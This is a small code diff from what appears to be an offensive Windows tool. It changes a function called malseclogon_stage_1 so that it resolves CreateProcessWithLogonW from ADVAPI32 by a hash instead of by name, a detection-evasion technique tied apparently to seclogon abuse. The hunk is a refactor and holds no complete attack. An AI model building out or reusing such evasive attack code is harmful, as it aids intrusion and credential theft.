@@ -297,10 +297,11 @@ BOOL malseclogon_stage_1(
     mbstowcs(filename, program_name, MAX_PATH);
 
     // find the address of CreateProcessWithLogonW dynamically
-    CREATEPROCESSWITHLOGONW CreateProcessWithLogonW;
-    CreateProcessWithLogonW = (CREATEPROCESSWITHLOGONW)GetFunctionAddress(
-        GetLibraryAddress(ADVAPI32),
-        CreateProcessWithLogonW_SW2_HASH
+    CreateProcessWithLogonW_t CreateProcessWithLogonW;
+    CreateProcessWithLogonW = (CreateProcessWithLogonW_t)get_function_address(
+        get_library_address(ADVAPI32_DLL, TRUE),
+        CreateProcessWithLogonW_SW2_HASH,
+        0
     );
     if (!CreateProcessWithLogonW)
     {
